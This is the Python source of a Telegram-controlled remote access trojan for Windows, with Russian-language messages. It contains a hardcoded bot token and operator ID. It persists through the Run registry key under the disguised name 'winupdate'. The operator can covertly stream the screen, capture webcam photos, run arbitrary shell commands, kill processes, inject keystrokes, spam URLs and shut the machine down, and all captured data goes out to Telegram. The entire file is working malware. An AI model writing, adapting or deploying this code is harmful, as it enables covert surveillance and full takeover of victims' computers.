import os
import sys
import logging
import time
from pynput.keyboard import Key, Controller
import pyautogui
import webbrowser
import telebot
from telebot import types
import cv2
import threading
import subprocess
import ctypes
import winreg
from PIL import Image
import psutil

bot = telebot.TeleBot('7663601253:AAErvm-i-qXkZ0KF8UuZNrbq99Cd6xFx5ck')
keyboard = Controller()
link_spam_active = False
current_spam_link = ""
screen_streaming_active = False

def add_to_startup():
    if sys.platform == 'win32':
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
                winreg.SetValueEx(reg_key, "winupdate", 0, winreg.REG_SZ, os.path.abspath(sys.argv[0]))
        except Exception:
            pass

def use_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('webcam.jpg', cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
                cap.release()
                return 'webcam.jpg'
        return None
    except Exception:
        return None

def link_spammer():
    global link_spam_active, current_spam_link
    while link_spam_active:
        try:
            webbrowser.open(current_spam_link)
            time.sleep(1)
        except Exception:
            time.sleep(1)

def set_wallpaper(image_path):
    try:
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
        return True
    except Exception as e:
        print(f"Ошибка установки обоев: {e}")
        return False

def screen_streamer(chat_id):
    global screen_streaming_active
    while screen_streaming_active:
        try:
            screenshot_path = 'stream.png'
            pyautogui.screenshot(screenshot_path)
            with open(screenshot_path, 'rb') as photo:
                bot.send_photo(chat_id, photo)
            os.remove(screenshot_path)
            time.sleep(1)
        except Exception as e:
            print(f"Ошибка трансляции: {e}")
            time.sleep(1)

def show_windows_message(title, text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x1)
        return True
    except Exception as e:
        print(f"Ошибка отображения сообщения: {e}")
        return False

def type_text(text):
    try:
        keyboard.type(text)
        return True
    except Exception as e:
        print(f"Ошибка ввода текста: {e}")
        return False

def get_running_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].endswith('.exe'):
                    processes.append(proc.info['name'])
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return list(set(processes))  # Удаляем дубликаты
    except Exception as e:
        print(f"Ошибка получения процессов: {e}")
        return []

def kill_process(process_name):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                proc.kill()
                return True
        return False
    except Exception as e:
        print(f"Ошибка завершения процесса: {e}")
        return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id == 1734359786:
        bot.send_message(message.chat.id, "🤖 Бот готов к работе! Выберите действие:", reply_markup=get_main_menu())
    else:
        bot.send_message(message.chat.id, "⛔ Доступ запрещен")

def get_main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
    row1 = ['📸 Скриншот', '🌐 Открыть сайт', '📷 Вебкамера']
    row2 = ['❌ Закрыть программу', '🔌 Выключить ПК', '🔄 Спам ссылкой']
    row3 = ['🖼️ Установить обои', '🗞️ Win+D', '⌨️ Клавиатура']
    row4 = ['⌨️ Команда CMD', '🖥️ Трансляция экрана', '⏹️ Остановить трансляцию']
    row5 = ['📊 Процессы', '❌ Завершить процесс']
    markup.add(*row1)
    markup.add(*row2)
    markup.add(*row3)
    markup.add(*row4)
    markup.add(*row5)
    return markup

@bot.message_handler(func=lambda m: m.text == '📸 Скриншот' and m.from_user.id == 1734359786)
def send_screenshot(message):
    try:
        pyautogui.screenshot('screen.png')
        with open('screen.png', 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption="🖥️ Вот ваш скриншот!")
        os.remove('screen.png')
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {e}")

@bot.message_handler(func=lambda m: m.text == '🌐 Открыть сайт' and m.from_user.id == 1734359786)
def ask_url(message):
    msg = bot.send_message(message.chat.id, "🔗 Введите URL сайта (например: youtube.com):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, open_url)

def open_url(message):
    if message.from_user.id == 1734359786:
        url = message.text if message.text.startswith(('http://', 'https://')) else 'http://' + message.text
        try:
            webbrowser.open(url)
            bot.send_message(message.chat.id, f"🌍 Открываю: {url}", reply_markup=get_main_menu())
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Ошибка: {e}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == '❌ Закрыть программу' and m.from_user.id == 1734359786)
def alt_f4(message):
    try:
        keyboard.press(Key.alt)
        keyboard.press(Key.f4)
        keyboard.release(Key.f4)
        keyboard.release(Key.alt)
        bot.send_message(message.chat.id, "🔄 Alt+F4 выполнено!")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {e}")

@bot.message_handler(func=lambda m: m.text == '🔌 Выключить ПК' and m.from_user.id == 1734359786)
def shutdown(message):
    try:
        os.system('shutdown /s /t 1')
        bot.send_message(message.chat.id, "⏳ Компьютер выключается...")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {e}")

@bot.message_handler(func=lambda m: m.text == '🔄 Спам ссылкой' and m.from_user.id == 1734359786)
def toggle_link_spam(message):
    global link_spam_active, current_spam_link
    if link_spam_active:
        link_spam_active = False
        bot.send_message(message.chat.id, "🛑 Спам ссылкой остановлен", reply_markup=get_main_menu())
    else:
        msg = bot.send_message(message.chat.id, "🔗 Введите URL для спама:", reply_markup=types.ReplyKeyboardRemove())
        bot.register_next_step_handler(msg, start_link_spam)

def start_link_spam(message):
    global link_spam_active, current_spam_link
    if message.from_user.id == 1734359786:
        current_spam_link = message.text if message.text.startswith(('http://', 'https://')) else 'http://' + message.text
        link_spam_active = True
        threading.Thread(target=link_spammer, daemon=True).start()
        bot.send_message(message.chat.id, f"🌀 Начинаю спам ссылкой: {current_spam_link}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == '📷 Вебкамера' and m.from_user.id == 1734359786)
def webcam(message):
    photo = use_webcam()
    if photo:
        with open(photo, 'rb') as p:
            bot.send_photo(message.chat.id, p, caption="📸 Фото с вебкамеры")
        os.remove(photo)
    else:
        bot.send_message(message.chat.id, "⚠️ Вебкамера недоступна")

@bot.message_handler(func=lambda m: m.text == '🖼️ Установить обои' and m.from_user.id == 1734359786)
def ask_wallpaper(message):
    msg = bot.send_message(message.chat.id, "🖼️ Отправьте изображение в формате PNG", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, set_wallpaper_handler)

def set_wallpaper_handler(message):
    try:
        if message.content_type != 'photo':
            bot.send_message(message.chat.id, "❌ Это не изображение!", reply_markup=get_main_menu())
            return
            
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open('wallpaper.png', 'wb') as new_file:
            new_file.write(downloaded_file)
        
        if set_wallpaper(os.path.abspath('wallpaper.png')):
            bot.send_message(message.chat.id, "✅ Обои успешно установлены!", reply_markup=get_main_menu())
        else:
            bot.send_message(message.chat.id, "❌ Ошибка установки обоев", reply_markup=get_main_menu())
            
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {str(e)}", reply_markup=get_main_menu())
    finally:
        if os.path.exists('wallpaper.png'):
            os.remove('wallpaper.png')

@bot.message_handler(func=lambda m: m.text == '🗞️ Win+D' and m.from_user.id == 1734359786)
def win_d_handler(message):
    try:
        keyboard.press(Key.cmd)
        keyboard.press('d')
        keyboard.release('d')
        keyboard.release(Key.cmd)
        bot.send_message(message.chat.id, "🗞️ Комбинация Win+D выполнена!")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {str(e)}")

@bot.message_handler(func=lambda m: m.text == '⌨️ Клавиатура' and m.from_user.id == 1734359786)
def ask_keyboard_text(message):
    msg = bot.send_message(message.chat.id, "⌨️ Введите текст для ввода с клавиатуры:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, type_text_handler)

def type_text_handler(message):
    try:
        text = message.text
        if type_text(text):
            bot.send_message(message.chat.id, "✅ Текст успешно введен!", reply_markup=get_main_menu())
        else:
            bot.send_message(message.chat.id, "❌ Не удалось ввести текст", reply_markup=get_main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {str(e)}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == '📊 Процессы' and m.from_user.id == 1734359786)
def show_processes(message):
    try:
        processes = get_running_processes()
        if processes:
            processes_str = "\n".join(processes)
            if len(processes_str) > 4000:
                processes_str = processes_str[:4000] + "\n... (список обрезан)"
            bot.send_message(message.chat.id, f"📊 Список процессов:\n```\n{processes_str}\n```", 
                           parse_mode='Markdown', reply_markup=get_main_menu())
        else:
            bot.send_message(message.chat.id, "ℹ️ Не удалось получить список процессов", reply_markup=get_main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {str(e)}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == '❌ Завершить процесс' and m.from_user.id == 1734359786)
def ask_process_to_kill(message):
    msg = bot.send_message(message.chat.id, "❌ Введите имя процесса для завершения (например: brave.exe):", 
                          reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, kill_process_handler)

def kill_process_handler(message):
    try:
        process_name = message.text.strip()
        if kill_process(process_name):
            bot.send_message(message.chat.id, f"✅ Процесс {process_name} успешно завершен!", reply_markup=get_main_menu())
        else:
            bot.send_message(message.chat.id, f"❌ Не удалось завершить процесс {process_name}", reply_markup=get_main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {str(e)}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == '⌨️ Команда CMD' and m.from_user.id == 1734359786)
def ask_cmd_command(message):
    msg = bot.send_message(message.chat.id, "⌨️ Введите команду для выполнения:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, execute_cmd)

def execute_cmd(message):
    try:
        command = message.text
        result = subprocess.run(
            command, 
            shell=True,
            capture_output=True,
            text=True,
            encoding='cp866'
        )
        
        output = result.stdout or result.stderr
        if not output:
            output = "Команда выполнена без вывода"
            
        if len(output) > 4000:
            output = output[:4000] + "\n... (вывод обрезан)"
            
        bot.send_message(message.chat.id, f"📟 Результат выполнения:\n```\n{output}\n```", 
                        parse_mode='Markdown', reply_markup=get_main_menu())
                        
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {str(e)}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == '🖥️ Трансляция экрана' and m.from_user.id == 1734359786)
def start_screen_stream(message):
    global screen_streaming_active
    if not screen_streaming_active:
        screen_streaming_active = True
        threading.Thread(target=screen_streamer, args=(message.chat.id,), daemon=True).start()
        bot.send_message(message.chat.id, "🖥️ Трансляция экрана начата!")
    else:
        bot.send_message(message.chat.id, "🌀 Трансляция уже запущена")

@bot.message_handler(func=lambda m: m.text == '⏹️ Остановить трансляцию' and m.from_user.id == 1734359786)
def stop_screen_stream(message):
    global screen_streaming_active
    if screen_streaming_active:
        screen_streaming_active = False
        if os.path.exists('stream.png'):
            os.remove('stream.png')
        bot.send_message(message.chat.id, "⏹️ Трансляция остановлена")
    else:
        bot.send_message(message.chat.id, "ℹ️ Трансляция не активна")

try:
    bot.send_message(1734359786, "🤖 Бот успешно запущен! Все функции доступны.")
    add_to_startup()
except Exception:
    pass

while True:
    try:
        bot.polling(none_stop=True)
    except Exception:
        time.sleep(15)